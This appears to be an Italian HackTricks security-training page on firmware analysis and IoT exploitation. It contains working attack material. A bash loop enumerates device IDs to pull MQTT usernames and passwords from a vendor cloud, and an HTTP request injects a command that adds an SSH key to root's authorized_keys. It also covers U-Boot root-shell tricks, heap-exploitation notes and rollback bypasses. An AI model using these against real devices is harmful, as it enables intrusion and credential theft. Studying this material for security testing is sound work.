# Analisi del Firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introduzione**

### Risorse correlate


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Il firmware è un software essenziale che consente ai dispositivi di funzionare correttamente, gestendo e facilitando la comunicazione tra i componenti hardware e il software con cui interagiscono gli utenti. È memorizzato nella memoria permanente, garantendo al dispositivo l'accesso alle istruzioni fondamentali fin dal momento dell'accensione, fino all'avvio del sistema operativo. L'analisi e la potenziale modifica del firmware sono passaggi critici per identificare le vulnerabilità di sicurezza.<sup>[[2]](#references)[[3]](#references)</sup>

## **Raccolta delle informazioni**

La **raccolta delle informazioni** è un passaggio iniziale fondamentale per comprendere la composizione di un dispositivo e le tecnologie che utilizza. Questo processo prevede la raccolta di dati su:

- L'architettura della CPU e il sistema operativo in esecuzione
- Specifiche del bootloader
- Layout hardware e datasheet
- Metriche della codebase e posizioni del codice sorgente
- Librerie esterne e tipi di licenza
- Cronologia degli aggiornamenti e certificazioni normative
- Diagrammi architetturali e di flusso
- Valutazioni di sicurezza e vulnerabilità identificate

A questo scopo, gli strumenti di **open-source intelligence (OSINT)** sono inestimabili, così come l'analisi di qualsiasi componente software open source disponibile attraverso processi di revisione manuali e automatizzati. Strumenti come [Coverity Scan](https://scan.coverity.com) e [LGTM di Semmle](https://lgtm.com/#explore) offrono static analysis gratuite che possono essere utilizzate per individuare potenziali problemi.

## **Acquisizione del Firmware**

Il firmware può essere ottenuto in vari modi, ognuno con un diverso livello di complessità:

- **Direttamente** dalla fonte (sviluppatori, produttori)
- **Compilandolo** seguendo le istruzioni fornite
- **Scaricandolo** dai siti ufficiali di supporto
- Utilizzando query **Google dork** per trovare file firmware ospitati online
- Accedendo direttamente al **cloud storage**, con strumenti come [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercettando gli **aggiornamenti** tramite tecniche man-in-the-middle
- **Estraendolo** dal dispositivo tramite connessioni come **UART**, **JTAG** o **PICit**
- Eseguendo lo **sniffing** delle richieste di aggiornamento nelle comunicazioni del dispositivo
- Identificando e utilizzando **endpoint di aggiornamento hardcoded**
- Eseguendo il **dump** dal bootloader o dalla rete
- **Rimuovendo e leggendo** il chip di memoria, quando ogni altro metodo fallisce, utilizzando strumenti hardware appropriati

### Log solo tramite UART: forzare una root shell tramite l'ambiente U-Boot nella flash

Se UART RX viene ignorato (solo log), puoi comunque forzare una init shell **modificando offline il blob dell'ambiente U-Boot**:<sup>[[6]](#references)</sup>

1. Esegui il dump della flash SPI con una clip SOIC-8 + programmatore (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Individua la partizione dell'ambiente U-Boot, modifica `bootargs` per includere `init=/bin/sh` e **ricalcola il CRC32 dell'ambiente U-Boot** per il blob.
3. Riscrivi solo la partizione dell'ambiente e riavvia; dovrebbe comparire una shell su UART.

Questo è utile sui dispositivi embedded in cui la shell del bootloader è disabilitata, ma la partizione dell'ambiente è scrivibile tramite l'accesso esterno alla flash.

## Analisi del firmware

Ora che **hai il firmware**, devi estrarre informazioni su di esso per sapere come gestirlo. Esistono diversi strumenti che puoi utilizzare a questo scopo:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Se non trovi molto con questi strumenti, controlla l'**entropia** dell'immagine con `binwalk -E <bin>`: se l'entropia è bassa, è improbabile che sia cifrata. Se l'entropia è alta, è probabilmente cifrata (o compressa in qualche modo).

Inoltre, puoi usare questi strumenti per estrarre **file incorporati nel firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oppure [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) per ispezionare il file.

### Ottenere il filesystem

Con gli strumenti precedentemente descritti, come `binwalk -ev <bin>`, dovresti essere riuscito a **estrarre il filesystem**.\
Binwalk solitamente lo estrae all'interno di una **cartella denominata in base al tipo di filesystem**, che solitamente è uno dei seguenti: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Estrazione manuale del filesystem

A volte binwalk **non include il magic byte del filesystem nelle proprie signature**. In questi casi, usa binwalk per **trovare l'offset del filesystem e fare il carving del filesystem compresso** dal binario, quindi **estrai manualmente** il filesystem in base al suo tipo utilizzando i passaggi riportati di seguito.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Esegui il seguente comando **dd** per effettuare il carving del filesystem Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
In alternativa, è possibile eseguire anche il comando seguente.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Per squashfs (utilizzato nell'esempio precedente)

`$ unsquashfs dir.squashfs`

Successivamente, i file si troveranno nella directory "`squashfs-root`".

- File di archivio CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Per filesystem jffs2

`$ jefferson rootfsfile.jffs2`

- Per filesystem ubifs con memoria flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analisi del Firmware

Una volta ottenuto il firmware, è essenziale analizzarlo per comprenderne la struttura e le potenziali vulnerabilità. Questo processo prevede l'utilizzo di vari strumenti per analizzare ed estrarre dati preziosi dall'immagine del firmware.

### Strumenti per l'analisi iniziale

Viene fornito un insieme di comandi per l'ispezione iniziale del file binario (indicato come `<bin>`). Questi comandi aiutano a identificare i tipi di file, estrarre le stringhe, analizzare i dati binari e comprendere i dettagli delle partizioni e del filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Per valutare lo stato della crittografia dell'immagine, si controlla l'**entropia** con `binwalk -E <bin>`. Una bassa entropia suggerisce l'assenza di crittografia, mentre un'alta entropia indica una possibile crittografia o compressione.

Per estrarre i **file incorporati**, sono consigliate risorse e tool come la documentazione **file-data-carving-recovery-tools** e **binvis.io** per l'ispezione dei file.

### Estrazione del filesystem

Utilizzando `binwalk -ev <bin>`, di solito è possibile estrarre il filesystem, spesso in una directory denominata in base al tipo di filesystem (ad esempio, squashfs, ubifs). Tuttavia, quando **binwalk** non riesce a riconoscere il tipo di filesystem a causa dell'assenza dei magic bytes, è necessaria un'estrazione manuale. Questa consiste nell'utilizzare `binwalk` per individuare l'offset del filesystem, seguito dal comando `dd` per estrarre il filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Successivamente, a seconda del tipo di filesystem (ad es. squashfs, cpio, jffs2, ubifs), vengono utilizzati comandi diversi per estrarre manualmente i contenuti.

### Analisi del filesystem

Con il filesystem estratto, inizia la ricerca di vulnerabilità di sicurezza. L'attenzione viene rivolta a network daemon non sicuri, credenziali hardcoded, endpoint API, funzionalità del server di aggiornamento, codice non compilato, script di avvio e binari compilati da sottoporre ad analisi offline.

Le **posizioni** e gli **elementi chiave** da esaminare includono:

- **etc/shadow** e **etc/passwd** per le credenziali degli utenti
- Certificati e chiavi SSL in **etc/ssl**
- File di configurazione e script per individuare potenziali vulnerabilità
- Binari embedded da sottoporre ad ulteriori analisi
- Web server e binari comuni dei dispositivi IoT

Diversi strumenti aiutano a individuare informazioni sensibili e vulnerabilità all'interno del filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) per la ricerca di informazioni sensibili
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) per un'analisi completa del firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ed [**EMBA**](https://github.com/e-m-b-a/emba) per l'analisi statica e dinamica

### Controlli di sicurezza sui binari compilati

Sia il codice sorgente sia i binari compilati trovati nel filesystem devono essere esaminati attentamente alla ricerca di vulnerabilità. Strumenti come **checksec.sh** per i binari Unix e **PESecurity** per i binari Windows aiutano a identificare binari non protetti che potrebbero essere sfruttati.

## Raccolta della configurazione cloud e delle credenziali MQTT tramite token URL derivati

Molti hub IoT recuperano la propria configurazione per dispositivo da un endpoint cloud simile a:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Durante l'analisi del firmware, potresti scoprire che `<token>` viene derivato localmente dal device ID utilizzando un secret hardcoded, ad esempio:

- token = MD5( deviceId || STATIC_KEY ) e rappresentato come esadecimale maiuscolo

Questo design consente a chiunque venga a conoscenza di un deviceId e dello STATIC_KEY di ricostruire l'URL e recuperare la configurazione cloud, rivelando spesso credenziali MQTT in plaintext e prefissi dei topic.

Workflow pratico:

1) Estrai il deviceId dai log di avvio UART

- Collega un adattatore UART da 3,3 V (TX/RX/GND) e acquisisci i log:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Cerca le righe che stampano il pattern dell'URL di configurazione del cloud e l'indirizzo del broker, ad esempio:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recuperare STATIC_KEY e l'algoritmo del token dal firmware

- Caricare i binari in Ghidra/radare2 e cercare il percorso di configurazione ("/pf/") o l'uso di MD5.
- Confermare l'algoritmo (ad es., MD5(deviceId||STATIC_KEY)).
- Derivare il token in Bash e convertire il digest in maiuscolo:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Raccogliere la configurazione cloud e le credenziali MQTT

- Componi l'URL e scarica il JSON con curl; analizzalo con jq per estrarre i segreti:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abusa di MQTT in plaintext e di ACL deboli per i topic (se presenti)

- Usa le credenziali recuperate per effettuare la sottoscrizione ai topic di manutenzione e cerca eventi sensibili:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerare gli ID dei dispositivi (su larga scala, con autorizzazione)

- Molti ecosistemi incorporano byte OUI/prodotto/tipo seguiti da un suffisso sequenziale.
- È possibile iterare sugli ID candidati, derivare i token e recuperare programmaticamente le configurazioni:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Note
- Ottenere sempre un'autorizzazione esplicita prima di tentare un'enumerazione su larga scala.
- Preferire, quando possibile, l'emulazione o l'analisi statica per recuperare i secrets senza modificare l'hardware target.


Il processo di emulazione del firmware consente l'**analisi dinamica** del funzionamento di un dispositivo o di un singolo programma. Questo approccio può incontrare difficoltà dovute alle dipendenze dall'hardware o dall'architettura, ma trasferire il root filesystem o specifici binari su un dispositivo con architettura ed endianness corrispondenti, come un Raspberry Pi, oppure su una macchina virtuale preconfigurata, può facilitare ulteriori test.

### Emulazione di singoli binari

Per esaminare singoli programmi, è fondamentale identificare l'endianness e l'architettura CPU del programma.

#### Esempio con architettura MIPS

Per emulare un binario con architettura MIPS, è possibile utilizzare il comando:
```bash
file ./squashfs-root/bin/busybox
```
E per installare gli strumenti di emulazione necessari:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Per MIPS (big-endian), viene utilizzato `qemu-mips`, mentre per i binary little-endian si usa `qemu-mipsel`.

#### Emulazione dell'architettura ARM

Per i binary ARM, il processo è simile, con l'emulatore `qemu-arm` utilizzato per l'emulazione.

### Emulazione dell'intero sistema

Strumenti come [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) e altri facilitano l'emulazione completa del firmware, automatizzando il processo e supportando l'analisi dinamica.

## Analisi dinamica nella pratica

A questo punto, per l'analisi viene utilizzato un ambiente del dispositivo reale o emulato. È essenziale mantenere l'accesso shell al sistema operativo e al filesystem. L'emulazione potrebbe non riprodurre perfettamente le interazioni hardware, rendendo occasionalmente necessario riavviare l'emulazione. L'analisi dovrebbe esaminare nuovamente il filesystem, sfruttare le pagine web e i network service esposti ed esplorare le vulnerabilità del bootloader. I test di integrità del firmware sono fondamentali per identificare potenziali vulnerabilità backdoor.

## Tecniche di analisi a runtime

L'analisi a runtime consiste nell'interagire con un processo o un binary nel suo ambiente operativo, utilizzando strumenti come gdb-multiarch, Frida e Ghidra per impostare breakpoint e identificare vulnerabilità tramite fuzzing e altre tecniche.

Per i target embedded privi di un debugger completo, **copia un `gdbserver` staticamente linkato** sul dispositivo e collegati da remoto:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Mappatura dei messaggi Zigbee / radio-co-processor

Negli hub IoT lo stack RF è spesso suddiviso tra una **radio MCU** e un processo userland Linux. Un workflow utile consiste nel mappare il percorso:<sup>[[8]](#references)</sup>

1. **RF frame** via etere
2. **controller-side parser** sulla radio MCU
3. **serial/UART text or TLV protocol** inoltrato a Linux (ad esempio `/dev/tty*`)
4. **application dispatcher** nel daemon principale
5. **protocol-specific handler / state machine**

Questa architettura crea due target di reversing invece di uno. Se il controller converte i radio frame binari in un protocollo testuale come `Group,Command,arg1,arg2,...`, individua:

- I **message groups** e le tabelle di dispatch
- Quali messaggi possono provenire dalla **network** e quali dal controller stesso
- Gli esatti **manufacturer-specific discriminator fields** (ad esempio Zigbee `manufacturer_code` e `cluster_command` custom)
- Quali handler sono raggiungibili solo durante le fasi di **commissioning**, discovery o download del firmware/modello

Per Zigbee nello specifico, cattura il traffico di pairing e verifica se il target utilizza ancora il **Link Key** predefinito `ZigBeeAlliance09`. In tal caso, sniffare il traffico di commissioning può esporre la **Network Key**. Gli install codes di Zigbee 3.0 riducono questa esposizione; verifica quindi se il dispositivo testato li applica effettivamente.

### Manufacturer-specific protocol handlers e reachability controllata da FSM

I comandi Zigbee/ZCL specifici del vendor sono spesso un target migliore rispetto ai cluster standardizzati, perché alimentano **custom parsing code** e **FSM** interne con validazioni meno collaudate.<sup>[[8]](#references)</sup>

Workflow pratico:

- Fai il reverse del command dispatcher fino a trovare il **vendor-only handler**.
- Recupera le tabelle di **FSM state**, **event**, **check**, **action** e **next-state**.
- Identifica gli **stati transitori** che avanzano automaticamente e i rami di retry/error che alla fine eseguono il reset o liberano lo stato controllato dall’attaccante.
- Conferma quali scambi di protocollo legittimi sono necessari per portare il daemon nello stato vulnerabile, invece di assumere che l’handler vulnerabile sia sempre raggiungibile.

Per i protocolli sensibili al timing, il packet replay da un framework Python può essere troppo lento. Un approccio più affidabile consiste nell’emulare un dispositivo legittimo su hardware reale (ad esempio un **nRF52840**) con uno stack di livello vendor, in modo da esporre gli **endpoints**, gli **attributes** e il timing corretto del commissioning.

### Classe di bug dei download frammentati nei daemon embedded

Una classe ricorrente di bug del firmware compare nei **download frammentati di blob/modelli/configurazioni**:<sup>[[8]](#references)</sup>

1. Il **first fragment** (`offset == 0`) memorizza `ctx->total_size` e alloca `malloc(total_size)`.
2. I frammenti successivi validano solo i campi **packet-local** controllati dall’attaccante, come `packet_total_size >= offset + chunk_len`.
3. La copia utilizza `memcpy(&ctx->buffer[offset], chunk, chunk_len)` senza verificare il limite rispetto alla **dimensione allocata originariamente**.

Questo consente a un attaccante di inviare:

- Un primo frammento valido con una **dimensione totale dichiarata ridotta**, per forzare una piccola allocazione nell’heap.
- Un frammento successivo con l’**offset previsto**, ma con un `chunk_len` maggiore.
- Una dimensione packet-local contraffatta che soddisfa i nuovi controlli, causando comunque l’overflow del buffer allocato originariamente.

Quando il percorso vulnerabile è protetto dalla logica di commissioning, l’exploitation deve includere una quantità sufficiente di **device emulation** per portare il target nello stato previsto di model-download o blob-download prima di inviare i frammenti malformati.

### Trigger di `free()` guidati dal protocollo

Nei daemon embedded, il modo più semplice per attivare l’heap metadata exploitation spesso non consiste nell’"attendere il cleanup", ma nel **forzare la gestione degli errori del protocollo**:<sup>[[8]](#references)</sup>

- Invia frammenti successivi malformati per portare la FSM negli stati di **retry** o **error**.
- Supera la soglia di retry affinché il daemon esegua il **reset del context** e liberi il buffer corrotto.
- Usa questo `free()` prevedibile per attivare le primitive lato allocator prima che il processo termini per motivi indipendenti.

Questo è particolarmente utile contro allocator **musl/uClibc/dlmalloc-like** in Linux embedded, dove la corruzione dei chunk metadata può trasformare la logica di unlink/unbin in una write primitive. Un pattern stabile consiste nel corrompere un **size field** per reindirizzare l’allocator traversal verso **fake chunks** predisposti all’interno del buffer sottoposto a overflow, invece di sovrascrivere immediatamente i puntatori reali dei bin causando il crash del processo.

## Binary Exploitation e Proof-of-Concept

Lo sviluppo di una PoC per le vulnerabilità identificate richiede una conoscenza approfondita dell’architettura del target e la programmazione in linguaggi di livello più basso. Le protezioni del binary runtime nei sistemi embedded sono rare, ma quando sono presenti possono essere necessarie tecniche come il Return Oriented Programming (ROP).

### Note sull’exploitation dei fastbin di uClibc (Linux embedded)

- **Fastbins + consolidation:** uClibc utilizza fastbin simili a quelli di glibc. Un’allocazione grande successiva può attivare `__malloc_consolidate()`, quindi ogni fake chunk deve superare i controlli (size valido, `fd = 0` e chunk circostanti considerati "in use").<sup>[[6]](#references)</sup>
- **Binary non-PIE sotto ASLR:** se ASLR è abilitato ma il binary principale è **non-PIE**, gli indirizzi `.data/.bss` interni al binary sono stabili. È possibile puntare a una regione che assomiglia già a un valido heap chunk header per far atterrare un’allocazione fastbin su una **function pointer table**.
- **NUL che arresta il parser:** quando viene effettuato il parsing del JSON, un `\x00` nel payload può arrestare il parsing mantenendo i byte controllati dall’attaccante successivi, destinati a uno stack pivot/ROP chain.
- **Shellcode tramite `/proc/self/mem`:** una ROP chain che chiama `open("/proc/self/mem")`, `lseek()` e `write()` può inserire shellcode eseguibile in una mapping nota e saltarvi.

## Sistemi operativi preparati per l’analisi del firmware

Sistemi operativi come [AttifyOS](https://github.com/adi0x90/attifyos) ed [EmbedOS](https://github.com/scriptingxss/EmbedOS) forniscono ambienti preconfigurati per il firmware security testing, dotati degli strumenti necessari.

## OS preparati per analizzare il firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS è una distro pensata per aiutare nella valutazione della sicurezza e nel penetration testing dei dispositivi Internet of Things (IoT). Fa risparmiare molto tempo fornendo un ambiente preconfigurato con tutti gli strumenti necessari già caricati.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operativo per l’embedded security testing basato su Ubuntu 18.04 e fornito con strumenti per il firmware security testing già preinstallati.

## Attacchi di Firmware Downgrade e meccanismi di aggiornamento non sicuri

Anche quando un vendor implementa controlli crittografici della firma per le immagini firmware, la **protezione dal version rollback (downgrade) viene spesso omessa**. Quando il bootloader o recovery-loader verifica solo la firma tramite una chiave pubblica incorporata, ma non confronta la *version* (o un contatore monotono) dell’immagine che viene flashata, un attaccante può installare legittimamente un **firmware più vecchio e vulnerabile che possiede comunque una firma valida**, reintroducendo così vulnerabilità corrette nelle versioni successive.<sup>[[4]](#references)</sup>

Workflow tipico dell’attacco:

1. **Ottieni un’immagine firmata più vecchia**
* Recuperala dal portale pubblico di download, dal CDN o dal sito di supporto del vendor.
* Estraila dalle applicazioni mobile/desktop associate (ad esempio all’interno di un Android APK in `assets/firmware/`).
* Recuperala da repository di terze parti come VirusTotal, archivi Internet, forum, ecc.
2. **Carica o servi l’immagine al dispositivo** tramite un qualsiasi canale di aggiornamento esposto:
* Web UI, API dell’app mobile, USB, TFTP, MQTT, ecc.
* Molti dispositivi IoT consumer espongono endpoint HTTP(S) *non autenticati* che accettano blob firmware codificati in Base64, li decodificano lato server e attivano il recovery/upgrade.
3. Dopo il downgrade, sfrutta una vulnerabilità corretta nella release più recente (ad esempio un filtro contro la command injection aggiunto successivamente).
4. Facoltativamente, riflasha l’immagine più recente oppure disabilita gli aggiornamenti per evitare il rilevamento una volta ottenuta la persistenza.

### Esempio: Command Injection dopo il Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Nel firmware vulnerabile (downgraded), il parametro `md5` viene concatenato direttamente in un comando shell senza sanitizzazione, consentendo l'injection di comandi arbitrari (in questo caso, abilitando l'accesso root basato su chiavi SSH). Le versioni successive del firmware hanno introdotto un filtro di base per i caratteri, ma l'assenza di protezione dal downgrade rende la correzione inefficace.<sup>[[4]](#references)</sup>

### Estrazione del Firmware dalle App Mobile

Molti vendor includono immagini firmware complete nelle applicazioni mobile companion, affinché l'app possa aggiornare il dispositivo tramite Bluetooth/Wi-Fi. Questi pacchetti sono comunemente archiviati non cifrati nell'APK/APEX, in percorsi come `assets/fw/` o `res/raw/`. Strumenti come `apktool`, `ghidra` o anche il semplice `unzip` consentono di estrarre immagini firmate senza interagire con l'hardware fisico.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass dell’anti-rollback presente solo nell’updater nei design con slot A/B

Alcuni vendor implementano effettivamente un **ratchet** anti-downgrade, ma solo nella logica dell’*updater* (ad esempio una routine UDS su CAN, un comando di recovery o un agente OTA in userspace). Se in seguito il **bootloader** controlla solo la firma/CRC dell’immagine e si fida della partition table o dei metadati dello slot, la protezione dal rollback può ancora essere bypassata.<sup>[[7]](#references)</sup>

Design debole tipico:

- I metadati del firmware contengono sia un descrittore della versione sia un **security ratchet** / contatore monotono.
- L’updater confronta il ratchet dell’immagine con un valore memorizzato nello storage persistente e rifiuta le immagini firmate più vecchie.
- Il **bootloader** non analizza quel ratchet e verifica solo header, CRC e firma prima di eseguire lo slot selezionato.
- L’attivazione dello slot viene memorizzata separatamente in una partition table o in un generation counter per slot e non è vincolata crittograficamente all’esatto digest del firmware validato.

Questo crea una primitive **validate-one-image / boot-another-image** nei sistemi dual-slot. Se l’attacker riesce a far contrassegnare dall’updater lo slot B come target del prossimo boot usando un’immagine firmata attuale e può sovrascrivere successivamente lo slot B prima del reboot, il bootloader potrebbe comunque avviare l’immagine sottoposta a downgrade perché si fida solo dei metadati dello slot già sottoposti a commit.

Pattern di abuso comune:

1. Caricare un firmware **current signed** nello slot passivo ed eseguire la normale routine di validazione/switch, così il layout contrassegna quello slot come prossimo slot attivo.
2. **Non riavviare ancora**. Rientrare nella routine di preparazione/cancellazione dello slot nella stessa sessione.
3. Sfruttare una logica obsoleta dello stato di boot o della selezione dello slot, in modo che l’updater cancelli **lo stesso slot fisico** appena promosso.
4. Scrivere in quello slot un firmware **più vecchio ma ancora firmato**.
5. Saltare la routine di validazione che applica il ratchet ed eseguire direttamente il reboot.
6. Il bootloader seleziona lo slot promosso, verifica solo firma/integrità e avvia l’immagine vecchia.

Elementi da cercare durante il reversing delle implementazioni di aggiornamento A/B:

- Selezione dello slot derivata da **flag di boot** che non vengono aggiornati dopo uno switch riuscito.
- Una routine in stile `prepare_passive_slot()` che cancella uno slot basandosi su uno stato obsoleto invece che sul **layout corrente sottoposto a commit**.
- Una funzione in stile `part_write_layout()` che incrementa solo un **generation counter** / flag active e non memorizza l’hash dell’immagine validata.
- Controlli del ratchet implementati nel codice userspace o dell’updater, ma **non** in ROM / bootloader / fasi di secure boot.
- Routine di cancellazione o recovery che lasciano lo slot contrassegnato come avviabile anche dopo che il suo contenuto è stato rimosso e riscritto.

### Checklist per valutare la logica di aggiornamento

* Il trasporto/l’autenticazione dell’*update endpoint* è adeguatamente protetto (TLS + autenticazione)?
* Il dispositivo confronta i **numeri di versione** o un **contatore monotono anti-rollback** prima del flashing?
* L’immagine viene verificata all’interno di una secure boot chain (ad esempio con firme controllate dal codice ROM)?
* Il **bootloader applica lo stesso ratchet** dell’updater, invece di controllare solo firma/CRC?
* I metadati di attivazione dello slot sono **vincolati al digest/versione del firmware validato**, oppure lo slot può essere modificato dopo la promozione?
* Dopo uno switch dello slot riuscito, il dispositivo è obbligato a riavviarsi oppure le routine successive di aggiornamento/cancellazione sono ancora raggiungibili nella stessa sessione?
* Il codice userland esegue ulteriori controlli di coerenza (ad esempio partition map consentita, numero del modello)?
* I flussi di aggiornamento *parziali* o di *backup* riutilizzano la stessa logica di validazione?

> 💡  Se manca uno qualsiasi degli elementi precedenti, la piattaforma è probabilmente vulnerabile agli attacchi di rollback.

## Firmware vulnerabile per fare pratica

Per esercitarsi nella scoperta di vulnerabilità nel firmware, utilizzare i seguenti progetti di firmware vulnerabile come punto di partenza.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recupero delle chiavi di decrittografia del firmware dallo stato embedded di KMS/Vault

Quando un’immagine di aggiornamento combina piccoli metadati in chiaro con un grande blob ad alta entropia, eseguire prima il triage del container invece di procedere subito con il brute-forcing:<sup>[[1]](#references)</sup>

- Scaricare header, offset e limiti di riga con `hexdump`, `xxd`, `strings -tx`, `base64 -d` e `binwalk -E`.
- `Salted__` di solito indica il formato `enc` di OpenSSL: i successivi 8 byte sono il salt e i byte rimanenti sono il ciphertext.
- Un campo Base64 che decodifica esattamente in `256` byte è un forte indizio che si stia osservando un ciphertext RSA-2048 che avvolge una password del firmware/chiave di sessione casuale.
- Il materiale PGP detached nello stesso file spesso protegge solo l’autenticità; non bisogna presumere che sia il meccanismo di confidenzialità.

Se la ricerca statica delle chiavi (`grep`, `strings`, ricerche PEM/PGP) non dà risultati, eseguire il reversing del **percorso operativo di decrittografia** invece di limitarsi a cercare chiavi private:

- Decompilare il binario dell’updater / di management e tracciare chi legge il blob crittografato, quale helper/API lo unwraps e quale logical key name richiede.
- Cercare nel root filesystem estratto lo stato di KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), oltre ai file di unità e agli script init.
- Considerare il testo in chiaro `vault operator unseal ...`, le recovery key, i bootstrap token o gli script locali di auto-unseal del KMS come equivalenti al materiale delle chiavi private.

Se l’appliance include il binario Vault originale e il backend di storage, riprodurre quell’ambiente è solitamente più semplice che reimplementare gli internals di Vault:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Con root sul KMS clonato:

